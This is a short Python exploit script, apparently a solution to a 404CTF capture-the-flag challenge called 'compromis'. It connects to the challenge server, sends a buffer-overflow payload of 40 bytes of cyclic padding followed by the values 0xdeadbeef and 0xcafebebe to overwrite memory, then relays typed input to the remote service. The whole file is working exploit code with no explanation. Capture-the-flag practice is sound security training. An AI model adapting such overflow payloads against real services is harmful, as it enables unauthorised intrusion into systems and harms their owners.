#!/usr/bin/env python
# coding: utf-8

from pwn import *
import socket

HOST = 'challenge.404ctf.fr'
PORT = 32458

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))
print ('Connexion vers ' + HOST + ':' + str(PORT) + ' reussie.')
g = cyclic_gen()
payload  = g.get(40)
payload += p32(0xdeadbeef)
payload += p32(0xcafebebe)
print(payload)
n = client.send(payload)
donnees = client.recv(1024)
print (donnees)
while 1:
	n = client.send((input(">")).encode())
	donnees = client.recv(1024)
	print (donnees)
client.close()

#p = process("./compromis")
#p.sendline(payload)
#p.interactive()
